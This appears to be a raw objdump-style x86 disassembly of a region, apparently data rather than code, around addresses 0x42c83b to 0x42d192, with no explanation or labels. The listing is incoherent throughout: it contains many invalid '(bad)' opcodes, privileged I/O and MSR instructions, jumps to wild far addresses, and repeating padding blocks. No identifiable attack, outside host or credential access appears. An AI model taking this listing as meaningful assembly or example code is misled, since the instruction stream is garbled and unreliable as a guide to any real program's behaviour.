  42c83b:	mov    ch,0x2a
  42c83d:	dec    esp
  42c83e:	ja     0x42c852
  42c840:	data16 sub dh,bh
  42c843:	sbb    al,BYTE PTR [edx-0x2a9022ea]
  42c849:	xor    al,0xc8
  42c84b:	scas   eax,DWORD PTR es:[edi]
  42c84c:	imul   edi,DWORD PTR [ebx],0xcfdf2842
  42c852:	xchg   edx,eax
  42c853:	fs jbe 0x42c852
  42c856:	sbb    eax,0x8c2ffaa5
  42c85b:	test   edi,0x50cd08a7
  42c861:	and    ecx,esi
  42c863:	cs push edx
  42c865:	add    ebp,eax
  42c867:	lods   eax,DWORD PTR ds:[esi]
  42c868:	cmp    al,0xf1
  42c86a:	xchg   DWORD PTR [esi],ebp
  42c86c:	mov    ch,0xd8
  42c86e:	mov    cl,0xc
  42c870:	movups xmm5,XMMWORD PTR [ecx+0x6d]
  42c874:	ror    edi,0xfe
  42c877:	aas    
  42c878:	or     DWORD PTR [eax+edi*1-0x75dcd901],ebx
  42c87f:	xlat   BYTE PTR ds:[ebx]
  42c880:	push   ds
  42c881:	and    ch,BYTE PTR [edi]
  42c883:	push   ebx
  42c884:	jmp    0x11d66649
  42c889:	push   edx
  42c88a:	lahf   
  42c88b:	xchg   ecx,eax
  42c88c:	pop    ecx
  42c88d:	popa   
  42c88e:	enter  0x8760,0x6c
  42c892:	or     bh,0xb
  42c895:	mov    edi,0x2eea2259
  42c89a:	sbb    DWORD PTR [edx+0x78e1ced2],ebx
  42c8a0:	mov    ss,WORD PTR [esp+edx*2+0x37]
  42c8a4:	sar    edx,0x98
  42c8a7:	cld    
  42c8a8:	syscall 
  42c8aa:	jl     0x42c8ae
  42c8ac:	pop    ecx
  42c8ad:	mov    esp,0x420c569
  42c8b2:	jmp    0xa5d6b069
  42c8b7:	cmp    eax,0x95198c2
  42c8bc:	stc    
  42c8bd:	sub    DWORD PTR [esp+ecx*1+0x44],ebx
  42c8c1:	loopne 0x42c8b0
  42c8c3:	pop    sp
  42c8c5:	mov    ebx,0x3bb28f5a
  42c8ca:	dec    edx
  42c8cb:	ins    BYTE PTR es:[edi],dx
  42c8cc:	rcl    DWORD PTR [ebp-0x2c],0xd8
  42c8d0:	mov    dl,0x35
  42c8d2:	mov    ds:0x420aa462,eax
  42c8d7:	adc    bh,dh
  42c8d9:	fiadd  DWORD PTR [edx+0x6d399e61]
  42c8df:	imul   ebp,DWORD PTR [ecx-0x44],0xffffffb7
  42c8e3:	push   es
  42c8e4:	lea    ebx,[eax-0x7a]
  42c8e7:	ins    BYTE PTR es:[edi],dx
  42c8e8:	in     eax,0x6a
  42c8ea:	add    ebp,0xffffffbf
  42c8ed:	add    BYTE PTR [ebp-0x1e],bh
  42c8f0:	fsub   st(1),st
  42c8f2:	out    dx,al
  42c8f3:	mov    bh,dh
  42c8f5:	clc    
  42c8f6:	mov    esi,0x1ef9d9da
  42c8fb:	add    eax,DWORD PTR [edx+0x7d484a64]
  42c901:	test   BYTE PTR [ecx+eax*1+0x1a5c54fe],0xd9
  42c909:	int3   
  42c90a:	in     al,dx
  42c90b:	and    BYTE PTR [edx*2+0xb4c990],cl
	...
  42c972:	add    BYTE PTR [eax],al
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x4a053cfe
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0x4e000001,al
  42c98d:	mov    eax,0x1ad10edb
  42c992:	or     BYTE PTR [edx-0x3d],ah
  42c995:	sahf   
  42c996:	lock ss dec esi
  42c999:	mov    esp,0x348e8ed9
  42c99e:	jp     0x42c967
  42c9a0:	xor    bh,ch
  42c9a2:	rol    BYTE PTR [ebx-0x1c53bad5],cl
  42c9a8:	call   0xd4a31a66
  42c9ad:	jb     0x42c936
  42c9af:	dec    ecx
  42c9b0:	mov    dl,0x1a
  42c9b2:	nop
  42c9b3:	out    0x22,al
  42c9b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9b6:	iret   
  42c9b7:	ins    DWORD PTR es:[edi],dx
  42c9b8:	clc    
  42c9b9:	mov    ecx,0xdb6122d
  42c9be:	stc    
  42c9bf:	and    bl,ch
  42c9c1:	out    dx,eax
  42c9c2:	fcmovb st,st(1)
  42c9c4:	push   eax
  42c9c5:	test   al,0x12
  42c9c7:	and    DWORD PTR [edi+eiz*8+0x4db57966],0x38
  42c9cf:	shl    DWORD PTR [ebx-0x1],0x43
  42c9d3:	mov    BYTE PTR [edx+ebx*2-0x74],ah
  42c9d7:	cdq    
  42c9d8:	adc    al,0x88
  42c9da:	jno    0x42c9af
  42c9dc:	xlat   BYTE PTR ds:[ebx]
  42c9dd:	and    dl,ch
  42c9df:	adc    ebp,DWORD PTR [edx-0x399d0d5f]
  42c9e5:	out    0x9c,eax
  42c9e7:	cdq    
  42c9e8:	xchg   DWORD PTR cs:[ecx+0x131f3c5],edx
  42c9ef:	rol    BYTE PTR [ecx-0x6e],1
  42c9f2:	(bad)
  42c9f5:	push   eax
  42c9f6:	retf   
  42c9f7:	adc    eax,0xda15d2d9
  42c9fc:	mov    ds:0x9d5e3305,al
  42ca01:	dec    eax
  42ca02:	les    eax,FWORD PTR [edi]
  42ca04:	in     al,0x8b
  42ca06:	out    0xc5,al
  42ca08:	sub    DWORD PTR [esi-0x4330110e],esp
  42ca0e:	cdq    
  42ca0f:	pop    edi
  42ca10:	out    0x5c,al
  42ca12:	cwde   
  42ca13:	xlat   BYTE PTR ds:[ebx]
  42ca14:	pop    es
  42ca15:	adc    eax,0xb1000ed
  42ca1a:	sub    al,0xbf
  42ca1c:	dec    ebp
  42ca1d:	pop    ss
  42ca1e:	jns    0x42ca7e
  42ca20:	dec    ecx
  42ca21:	dec    ebp
  42ca22:	add    eax,0xfe1d56e4
  42ca27:	retf   
  42ca28:	pop    ss
  42ca29:	fisubr WORD PTR [ebp-0x73]
  42ca2c:	push   0x20
  42ca2e:	push   ds
  42ca2f:	test   BYTE PTR [edx+0x17],0x6a
  42ca33:	sbb    DWORD PTR [edx],eax
  42ca35:	mov    esi,0xb01c63d1
  42ca3a:	dec    esp
  42ca3b:	std    
  42ca3c:	in     eax,dx
  42ca3d:	fwait
  42ca3e:	mov    DWORD PTR [ecx+ebx*8],esp
  42ca41:	rcl    esi,0x7c
  42ca44:	inc    ebp
  42ca45:	fistp  WORD PTR [ebp+0x57f9c332]
  42ca4b:	adc    cl,BYTE PTR [ebp-0x24c680f3]
  42ca51:	js     0x42ca23
  42ca53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca54:	lock adc DWORD PTR [ebx-0x6cd96e03],0x2d
  42ca5c:	std    
  42ca5d:	xor    bl,BYTE PTR [edx]
  42ca5f:	mov    edi,DWORD PTR ds:[ecx]
  42ca62:	push   esp
  42ca63:	add    edx,edx
  42ca65:	hlt    
  42ca66:	lahf   
  42ca67:	jbe    0x42cae4
  42ca69:	sbb    edi,DWORD PTR [edx]
  42ca6b:	jl     0x42ca2d
  42ca6d:	add    ch,BYTE PTR [eax]
  42ca6f:	jmp    0x7bda2132
  42ca74:	and    al,0x36
  42ca77:	aas    
  42ca78:	out    dx,eax
  42ca79:	mov    ecx,0xeee3f020
  42ca7e:	scas   al,BYTE PTR es:[edi]
  42ca7f:	xor    DWORD PTR [eax],esi
  42ca81:	inc    edx
  42ca82:	repnz adc DWORD PTR [ecx-0x78],0x44
  42ca87:	ins    DWORD PTR es:[edi],dx
  42ca88:	stos   DWORD PTR es:[edi],eax
  42ca89:	test   al,0x62
  42ca8b:	jbe    0x42caf9
  42ca8d:	fld    TBYTE PTR [ebx]
  42ca8f:	popa   
  42ca90:	inc    BYTE PTR [eax]
	...
  42caf2:	add    BYTE PTR [eax],al
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x3e296ec0]
  42cb02:	push   es
  42cb03:	repz add al,0xdf
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    eax,0x86000001
  42cb0d:	shr    DWORD PTR [ebx+0x72],cl
  42cb10:	stc    
  42cb11:	cmp    al,0x15
  42cb13:	fild   DWORD PTR [ebp+0x207a53f8]
  42cb19:	mov    BYTE PTR [eax-0x14],bl
  42cb1c:	inc    esi
  42cb1d:	arpl   WORD PTR [edi-0x2de25053],si
  42cb23:	scas   eax,DWORD PTR es:[edi]
  42cb24:	loopne 0x42cadf
  42cb26:	jl     0x42cb26
  42cb28:	shr    ebp,cl
  42cb2a:	test   eax,0xfeae93c7
  42cb2f:	ins    DWORD PTR es:[edi],dx
  42cb30:	or     dl,BYTE PTR [ebp-0x3a]
  42cb33:	push   es
  42cb34:	xor    DWORD PTR [ecx],0x51
  42cb37:	sahf   
  42cb38:	jle    0x42cb82
  42cb3a:	out    0x78,al
  42cb3c:	push   eax
  42cb3d:	and    ebx,DWORD PTR [ebp+0x42]
  42cb40:	adc    BYTE PTR [ebp+0x1a371591],ah
  42cb46:	inc    ebx
  42cb47:	or     al,0xa
  42cb49:	lock mov al,0xbe
  42cb4c:	(bad)  
  42cb4d:	fiadd  DWORD PTR [esi]
  42cb4f:	das    
  42cb50:	popf   
  42cb51:	aaa    
  42cb52:	cmp    BYTE PTR [ecx-0x1a3ad72a],al
  42cb58:	shr    BYTE PTR [edi*4+0x7893e3a1],cl
  42cb5f:	jnp    0x42cb86
  42cb61:	retf   0xe345
  42cb64:	je     0x42cb1b
  42cb66:	dec    ecx
  42cb68:	(bad)
  42cb6b:	xchg   ebx,eax
  42cb6c:	dec    eax
  42cb6d:	cmp    eax,0xfa8fdaf8
  42cb72:	push   edi
  42cb73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb74:	hlt    
  42cb75:	mov    esp,0xb25e1967
  42cb7a:	fstp   st(1)
  42cb7c:	pop    eax
  42cb7d:	sahf   
  42cb7e:	std    
  42cb7f:	pop    ds
  42cb80:	pop    edx
  42cb81:	add    ch,dl
  42cb83:	fiadd  DWORD PTR [edi+0x69]
  42cb86:	adc    DWORD PTR [esi+0x7f],edi
  42cb89:	pop    ebp
  42cb8a:	enter  0x8b2e,0xd4
  42cb8e:	mov    ecx,0x8e4280a4
  42cb93:	pop    es
  42cb94:	dec    ebx
  42cb95:	jecxz  0x42cb22
  42cb97:	pop    eax
  42cb98:	sbb    ebx,DWORD PTR [ecx+esi*1]
  42cb9b:	das    
  42cb9c:	pop    edx
  42cb9d:	shl    cl,0x10
  42cba0:	add    al,0x62
  42cba2:	call   0x6d1:0xf9eee6ba
  42cba9:	jmp    0x42cc1c
  42cbab:	std    
  42cbac:	adc    al,0x22
  42cbae:	ds das 
  42cbb0:	sbb    eax,0x28ff5fdb
  42cbb5:	psubq  mm1,QWORD PTR [edx+0x1c2733ab]
  42cbbc:	cmp    cl,BYTE PTR [edi]
  42cbbe:	dec    ecx
  42cbbf:	repnz or bl,BYTE PTR [edx-0x7a]
  42cbc3:	cwde   
  42cbc4:	or     al,0x8e
  42cbc6:	cmp    ebx,edx
  42cbc8:	jne    0x42cb50
  42cbca:	mov    BYTE PTR [edx-0x275fdd16],bl
  42cbd0:	sar    DWORD PTR [ebx-0x55],0x34
  42cbd4:	push   es
  42cbd5:	mov    esi,0x85dc774
  42cbda:	inc    esi
  42cbdb:	in     eax,0xcb
  42cbdd:	sbb    eax,0x4e18cba2
  42cbe2:	out    dx,al
  42cbe3:	xchg   ebp,eax
  42cbe4:	out    0x90,al
  42cbe6:	fcomp  DWORD PTR [ebp-0x21]
  42cbe9:	push   cs
  42cbea:	xchg   ebp,eax
  42cbeb:	js     0x42cc5b
  42cbed:	pop    esp
  42cbee:	xchg   ebp,eax
  42cbef:	cdq    
  42cbf0:	adc    BYTE PTR [ebx-0x22348baa],bl
  42cbf6:	sbb    al,ah
  42cbf8:	push   es
  42cbf9:	pop    ds
  42cbfa:	add    ch,bl
  42cbfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cbfd:	mov    dh,0xa4
  42cbff:	outs   dx,DWORD PTR cs:[esi]
  42cc01:	cli    
  42cc02:	jnp    0x42cc63
  42cc04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc05:	cmp    al,0xe8
  42cc07:	sub    ebx,0x1
  42cc0a:	fs sub ch,bh
  42cc0d:	int3   
  42cc0e:	ins    DWORD PTR es:[edi],dx
  42cc0f:	pop    edx
  42cc10:	pop    eax
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x4e6cb1a
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0x9f000001
  42cc8d:	push   esp
  42cc8e:	push   edx
  42cc8f:	xchg   ebx,eax
  42cc90:	jmp    0x42cccd
  42cc92:	sar    DWORD PTR [eax],0x15
  42cc95:	pop    ecx
  42cc96:	ins    BYTE PTR es:[edi],dx
  42cc97:	mov    bh,0xa0
  42cc99:	scas   eax,DWORD PTR es:[edi]
  42cc9a:	xor    bl,0xd0
  42cc9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc9e:	in     al,dx
  42cc9f:	ss dec esi
  42cca1:	mov    ch,0xc0
  42cca3:	and    al,0x9a
  42cca5:	sti    
  42cca6:	call   0x99c67c3a
  42ccab:	pop    ebx
  42ccac:	push   esi
  42ccad:	call   0xda6e:0xf924f71a
  42ccb4:	push   ds
  42ccb5:	pop    edx
  42ccb6:	enter  0x389,0xa1
  42ccba:	mov    al,0xf5
  42ccbd:	shl    BYTE PTR [eax-0x4bbfd9b2],0x43
  42ccc4:	scas   eax,DWORD PTR es:[edi]
  42ccc5:	and    DWORD PTR [edx-0x1d],edx
  42ccc8:	loop   0x42cd44
  42ccca:	int    0xbf
  42cccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cccd:	test   eax,0xbae4c4dc
  42ccd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ccd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ccd4:	imul   edi,DWORD PTR [ebp+0x26],0x64c41bdb
  42ccdb:	pop    esp
  42ccdc:	mov    edx,0x4a67eaed
  42cce1:	cmp    al,0xc3
  42cce3:	dec    ebx
  42cce4:	ror    dh,0x6b
  42cce7:	pop    edi
  42cce8:	dec    ebp
  42cce9:	mov    cl,0x12
  42cceb:	stos   BYTE PTR es:[edi],al
  42ccec:	mov    ecx,0xb18926cc
  42ccf1:	mov    ah,ah
  42ccf3:	cmp    ecx,edx
  42ccf5:	jge    0x42ccc0
  42ccf7:	neg    DWORD PTR ds:0x24ddff2b
  42ccfd:	jmp    0x42cd7a
  42ccff:	sbb    al,0x86
  42cd01:	pop    esi
  42cd02:	stc    
  42cd03:	scas   eax,DWORD PTR es:[edi]
  42cd04:	cld    
  42cd05:	dec    edi
  42cd06:	mov    ds:0x2a800f31,al
  42cd0b:	pop    esi
  42cd0c:	mov    sp,0x3b95
  42cd10:	add    ebx,edi
  42cd12:	icebp  
  42cd13:	pop    esi
  42cd14:	mov    ch,0x51
  42cd16:	fmul   DWORD PTR [ecx+0x4e]
  42cd19:	and    al,0x1d
  42cd1b:	sar    edi,1
  42cd1d:	mov    ebx,0x3913f9ac
  42cd22:	or     BYTE PTR [edi+0x3],0xd6
  42cd26:	sub    ecx,DWORD PTR [esi]
  42cd28:	(bad)  
  42cd29:	push   ss
  42cd2a:	(bad)  
  42cd2b:	push   ebp
  42cd2c:	fs das 
  42cd2e:	scas   eax,DWORD PTR es:[edi]
  42cd2f:	hlt    
  42cd30:	sbb    DWORD PTR [esi+0x7c8514ec],esp
  42cd36:	sub    BYTE PTR [edx],0x54
  42cd39:	jae    0x42cce2
  42cd3b:	xchg   ebx,eax
  42cd3c:	pop    ds
  42cd3d:	stos   DWORD PTR es:[edi],eax
  42cd3e:	in     eax,dx
  42cd3f:	imul   eax,DWORD PTR [eax+0x4d],0x15cacdc4
  42cd46:	and    ebp,DWORD PTR [esi-0x16b031ae]
  42cd4c:	cwde   
  42cd4d:	imul   edi,ecx,0x76432e83
  42cd53:	mov    ds:0xf2255b8e,eax
  42cd58:	bound  ebp,QWORD PTR [eax]
  42cd5a:	push   ebx
  42cd5b:	jne    0x42cd4c
  42cd5d:	inc    edi
  42cd5f:	mov    gs,WORD PTR [edi+ebp*2+0x483fde55]
  42cd66:	xor    edi,DWORD PTR [ecx-0x1ee75b6b]
  42cd6c:	popa   
  42cd6d:	push   ss
  42cd6e:	call   0x74cb:0xb839aee9
  42cd75:	mov    eax,ds:0x91b0d7a5
  42cd7a:	wrmsr  
  42cd7c:	push   edi
  42cd7d:	stc    
  42cd7e:	repnz or edi,esp
  42cd81:	into   
  42cd82:	scas   eax,DWORD PTR es:[edi]
  42cd83:	(bad)  
  42cd84:	test   DWORD PTR [edi+0x1d9d8945],ecx
  42cd8a:	shl    BYTE PTR [edi-0x49],1
  42cd8d:	sbb    DWORD PTR [di-0x47],eax
	...
  42cdf1:	add    BYTE PTR [eax],al
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0xc5
  42ce01:	nop
  42ce02:	fcom   QWORD PTR [ecx+0xe]
  42ce05:	loope  0x42ce08
  42ce07:	add    BYTE PTR ds:0x9000001,al
  42ce0d:	xor    eax,0x5a9ace5b
  42ce12:	std    
  42ce13:	(bad)  [edx-0xef2c475]
  42ce19:	outs   dx,DWORD PTR ds:[esi]
  42ce1a:	mov    dl,0xac
  42ce1c:	add    DWORD PTR [eax+esi*2],edi
  42ce1f:	lea    ecx,[eax+edi*8+0x66]
  42ce23:	es pop eax
  42ce25:	cmp    esi,DWORD PTR [edx]
  42ce27:	ret    0x1d1c
  42ce2a:	cmp    eax,0x1f35be26
  42ce2f:	(bad)  
  42ce30:	pop    esi
  42ce31:	add    bh,cl
  42ce33:	ret    
  42ce34:	push   ds
  42ce35:	stos   BYTE PTR es:[edi],al
  42ce36:	cli    
  42ce37:	int3   
  42ce38:	popa   
  42ce39:	pop    edi
  42ce3a:	adc    bl,ah
  42ce3c:	lahf   
  42ce3d:	inc    ebp
  42ce3e:	xchg   esp,eax
  42ce3f:	adc    DWORD PTR ds:0xf6131b77,esi
  42ce45:	fidiv  WORD PTR [ecx-0x41]
  42ce48:	and    ecx,DWORD PTR [edi]
  42ce4a:	fwait
  42ce4b:	jnp    0x42ce76
  42ce4d:	adc    bh,BYTE PTR [esi]
  42ce4f:	into   
  42ce50:	jge    0x42ce54
  42ce52:	xchg   ebp,eax
  42ce53:	mov    ah,0xf4
  42ce55:	xchg   edi,eax
  42ce56:	push   ecx
  42ce57:	jl     0x42ce9a
  42ce59:	mov    ah,0x8b
  42ce5b:	xor    eax,0x4c8e3b35
  42ce60:	dec    edx
  42ce61:	nop
  42ce62:	jnp    0x42ceac
  42ce64:	mov    ecx,DWORD PTR [edx]
  42ce66:	or     BYTE PTR [edx-0xef81cdb],al
  42ce6c:	fs jo  0x42ce78
  42ce6f:	push   eax
  42ce70:	out    dx,eax
  42ce71:	and    bh,al
  42ce73:	in     al,dx
  42ce74:	sahf   
  42ce75:	xchg   edx,eax
  42ce76:	jg     0x42cef7
  42ce78:	cmc    
  42ce79:	adc    dl,BYTE PTR [ecx]
  42ce7b:	ds xchg esi,eax
  42ce7d:	popa   
  42ce7e:	pop    esp
  42ce7f:	lods   eax,DWORD PTR ds:[esi]
  42ce80:	faddp  st(5),st
  42ce82:	push   cs
  42ce83:	jno    0x42cee7
  42ce85:	mov    ecx,0xca7316c
  42ce8a:	pop    eax
  42ce8b:	pushf  
  42ce8c:	mov    esi,0x2396c3b
  42ce91:	jae    0x42cee7
  42ce93:	popf   
  42ce94:	inc    ebp
  42ce95:	adc    dh,BYTE PTR [esi+0x59d15942]
  42ce9b:	lock push esp
  42ce9d:	rcl    DWORD PTR [edi+0x45e563f6],cl
  42cea3:	popf   
  42cea4:	(bad)  
  42cea5:	icebp  
  42cea6:	and    bl,BYTE PTR [ecx+0x3b25916c]
  42ceac:	pusha  
  42cead:	mov    cl,0x89
  42ceaf:	hlt    
  42ceb0:	nop
  42ceb1:	jp     0x42cece
  42ceb3:	inc    ebp
  42ceb4:	mov    eax,0x67c352b8
  42ceb9:	pop    ds
  42ceba:	sub    al,0x45
  42cebc:	mov    al,0xe2
  42cebe:	add    bl,BYTE PTR [ebp-0x60]
  42cec1:	adc    eax,0x3097d7f2
  42cec6:	xchg   BYTE PTR [ebx+ecx*2],al
  42cec9:	push   esp
  42ceca:	cmp    DWORD PTR [edx],esp
  42cecc:	inc    ebx
  42cecd:	in     eax,0xa5
  42cecf:	lea    ecx,[ecx-0x62]
  42ced2:	sub    al,0xd3
  42ced4:	xor    ah,dl
  42ced6:	fimul  DWORD PTR [edi]
  42ced8:	shl    BYTE PTR [ebx+0x30],cl
  42cedb:	add    eax,0x45df8ac2
  42cee0:	jns    0x42ceb4
  42cee2:	sbb    al,0xe7
  42cee4:	call   0xd52cefd6
  42cee9:	stos   DWORD PTR es:[edi],eax
  42ceea:	adc    bh,BYTE PTR [ecx]
  42ceec:	(bad)  
  42ceed:	fld    TBYTE PTR ds:0xee301456
  42cef3:	sub    al,BYTE PTR [ecx]
  42cef5:	shr    DWORD PTR [ebx+0x62],0x91
  42cef9:	hlt    
  42cefa:	add    DWORD PTR [eax+0x39],0x2c
  42cefe:	fistp  QWORD PTR [esi]
  42cf00:	stos   DWORD PTR es:[edi],eax
  42cf01:	test   DWORD PTR [eax+0x71],ebx
  42cf04:	in     al,0xfb
  42cf06:	add    BYTE PTR [edi],ch
  42cf08:	cmp    eax,0xc268d748
  42cf0d:	gs pop esi
  42cf0f:	fidivr DWORD PTR ds:0x0
	...
  42cf71:	add    BYTE PTR [eax],al
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    ecx,FWORD PTR [ebp+0x139746f4]
  42cf85:	loop   0x42cf88
  42cf87:	add    BYTE PTR ds:0x15000001,al
  42cf8d:	cld    
  42cf8e:	jmp    0xdf4e:0x9ab4b562
  42cf95:	fbld   TBYTE PTR [eax+0x61]
  42cf98:	xor    ecx,DWORD PTR [ebx]
  42cf9a:	add    BYTE PTR [edx+0x20d9e9a3],ah
  42cfa0:	stos   BYTE PTR es:[edi],al
  42cfa1:	retf   0xab7f
  42cfa4:	ins    BYTE PTR es:[edi],dx
  42cfa5:	rol    DWORD PTR [esi+0x57],1
  42cfa8:	js     0x42cfe3
  42cfaa:	gs call 0x24ba:0x6a8b7fda
  42cfb2:	pop    ebp
  42cfb3:	adc    al,0x25
  42cfb5:	sub    ah,bh
  42cfb7:	jge    0x42cff4
  42cfb9:	add    BYTE PTR [esp+edi*4-0x26],0x65
  42cfbe:	push   cs
  42cfbf:	dec    esi
  42cfc0:	ins    DWORD PTR es:[edi],dx
  42cfc1:	mov    ch,0xcc
  42cfc3:	mov    al,0x77
  42cfc5:	or     DWORD PTR ds:0x353e0db7,eax
  42cfcb:	inc    ebp
  42cfcc:	and    dl,BYTE PTR [ebp*8-0x78904643]
  42cfd3:	je     0x42cfcb
  42cfd5:	sbb    dh,al
  42cfd7:	jbe    0x42cf7a
  42cfd9:	adc    al,0x6e
  42cfdb:	lds    edx,FWORD PTR [ecx]
  42cfdd:	pop    ebx
  42cfde:	call   0x516747c2
  42cfe3:	pop    esp
  42cfe4:	mov    fs,WORD PTR [ebx+ebp*1]
  42cfe7:	sbb    al,BYTE PTR [edi-0x28]
  42cfea:	in     eax,0x0
  42cfec:	mov    al,ds:0xa04ca4b7
  42cff1:	mov    ah,ch
  42cff3:	test   BYTE PTR [esi],0xb4
  42cff6:	in     al,dx
  42cff7:	pop    esp
  42cff8:	pop    ecx
  42cff9:	jg     0x42d071
  42cffb:	cmp    esi,edi
  42cffd:	pop    ebx
  42cffe:	adc    edx,DWORD PTR [edi+0x73]
  42d001:	cmp    BYTE PTR [ebp+0x36],0xe2
  42d005:	mov    cl,BYTE PTR [ebx+0x6eb03175]
  42d00b:	popa   
  42d00c:	xchg   esi,eax
  42d00d:	popa   
  42d00e:	mov    al,0x70
  42d010:	jmp    0x3756d1c5
  42d015:	ins    DWORD PTR es:[edi],dx
  42d016:	push   edi
  42d017:	cmp    BYTE PTR [ebx],dl
  42d019:	mov    ch,0xb3
  42d01b:	mov    cl,0x98
  42d01d:	xchg   edx,eax
  42d01e:	sbb    ecx,ebx
  42d020:	and    al,0xd9
  42d022:	pop    esi
  42d023:	adc    eax,0x2fd25a7b
  42d028:	test   DWORD PTR [esi+0x39],esp
  42d02b:	xchg   edi,eax
  42d02c:	cmp    DWORD PTR [esi+0x5f],eax
  42d02f:	pushf  
  42d030:	or     BYTE PTR [edi-0x5878021c],ah
  42d036:	cdq    
  42d037:	jo     0x42d06c
  42d039:	push   cs
  42d03a:	jb     0x42cfe6
  42d03c:	in     al,dx
  42d03d:	hlt    
  42d03e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d03f:	pop    edx
  42d040:	fsubp  st(1),st
  42d042:	mov    esi,0xf28feca9
  42d047:	cmp    cl,BYTE PTR [ecx]
  42d049:	jp     0x42d012
  42d04b:	inc    edx
  42d04c:	pop    esi
  42d04d:	push   0x1f05be0
  42d052:	mov    ch,0x46
  42d054:	addr16 dec esp
  42d056:	mov    dl,0x43
  42d058:	add    BYTE PTR ds:0xc3f6691e,dl
  42d05e:	inc    ebp
  42d05f:	out    0x63,al
  42d061:	jmp    0x42d088
  42d063:	stos   DWORD PTR es:[edi],eax
  42d064:	mov    al,0xf8
  42d066:	(bad)  
  42d068:	repnz dec esi
  42d06a:	mov    al,0x6a
  42d06c:	sbb    ecx,esp
  42d06e:	and    edi,eax
  42d070:	cmc    
  42d071:	or     bl,BYTE PTR [edi-0x463afe7f]
  42d077:	(bad)  [eax]
  42d079:	jge    0x42d0f5
  42d07b:	and    eax,0xfaa854c9
  42d080:	int3   
  42d081:	cs fs push ebx
  42d084:	call   0x1ab3:0x51e3db57
  42d08b:	inc    ebp
  42d08c:	dec    ebp
  42d08d:	out    0x12,eax
  42d08f:	adc    dh,BYTE PTR [edi]
	...
  42d0f1:	add    BYTE PTR [eax],al
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [ecx+0x52],dh
  42d102:	xor    ch,BYTE PTR [edi]
  42d104:	sbb    bl,ah
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    eax,0x4000001
  42d10d:	out    dx,al
  42d10e:	les    eax,FWORD PTR [edx-0x1502fd5e]
  42d114:	mov    dh,0x7f
  42d116:	inc    eax
  42d117:	fcmovnu st,st(1)
  42d119:	in     eax,dx
  42d11a:	pop    es
  42d11b:	pop    ecx
  42d11c:	in     al,0x86
  42d11e:	jae    0x42d0c1
  42d120:	outs   dx,BYTE PTR ds:[esi]
  42d121:	xchg   esp,eax
  42d122:	jl     0x42d0c0
  42d124:	mov    edi,0x7ae80d75
  42d129:	ss inc edi
  42d12b:	inc    ebx
  42d12c:	cmc    
  42d12d:	or     BYTE PTR [ebx],0x45
  42d130:	shl    BYTE PTR [edi+0x6f968a75],0x2
  42d137:	in     al,dx
  42d138:	add    al,0x16
  42d13a:	xchg   edx,eax
  42d13b:	xchg   DWORD PTR [ebp-0x15],eax
  42d13e:	sbb    al,0x30
  42d140:	call   0xc4af:0x87cacfa7
  42d147:	xchg   DWORD PTR [ebx],eax
  42d149:	sbb    cl,ch
  42d14b:	pop    esp
  42d14c:	dec    ebx
  42d14d:	aam    0xd1
  42d14f:	retf   0x1ccd
  42d152:	iret   
  42d153:	daa    
  42d154:	nop
  42d155:	inc    edx
  42d156:	(bad)
  42d159:	push   edi
  42d15a:	pushf  
  42d15b:	sbb    BYTE PTR [edi],bl
  42d15d:	dec    eax
  42d15e:	jns    0x42d196
  42d160:	sti    
  42d161:	cli    
  42d162:	push   ebx
  42d163:	jg     0x42d172
  42d165:	clc    
  42d166:	and    ecx,DWORD PTR [edx+0x5d]
  42d169:	mov    dl,BYTE PTR [ebp+0x8]
  42d16c:	and    al,0x6f
  42d16e:	jecxz  0x42d112
  42d170:	jl     0x42d13a
  42d172:	push   0x55
  42d174:	data16 jg 0x42d1be
  42d177:	imul   ebx
  42d179:	xchg   ebx,eax
  42d17a:	(bad)  
  42d17b:	out    dx,eax
  42d17c:	out    0x3b,al
  42d17e:	iret   
  42d17f:	aam    0xce
  42d181:	lods   al,BYTE PTR ds:[esi]
  42d182:	pusha  
  42d183:	mov    bl,0xcc
  42d185:	mov    ebp,0xb8d65d4c
  42d18a:	fs into 
  42d18c:	push   edi
  42d18d:	jno    0x42d1e8
  42d18f:	leave  
  42d190:	pop    ecx
  42d191:	lahf   
  42d192:	cmc    
